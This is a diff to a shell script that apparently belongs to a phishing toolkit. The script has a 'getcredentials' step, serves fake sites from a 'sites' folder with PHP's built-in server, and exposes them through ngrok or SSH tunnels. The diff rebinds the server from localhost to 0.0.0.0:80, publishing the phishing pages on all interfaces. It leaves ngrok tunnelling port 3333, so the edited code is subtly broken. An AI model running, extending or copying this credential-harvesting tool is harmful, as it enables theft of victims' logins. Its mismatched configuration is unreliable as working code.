@@ -381,7 +381,7 @@ getcredentials
 ##
 serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd sites/$server && php -S 0.0.0.0:80 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
@@ -470,7 +470,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd sites/$server && php -S 0.0.0.0:80 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
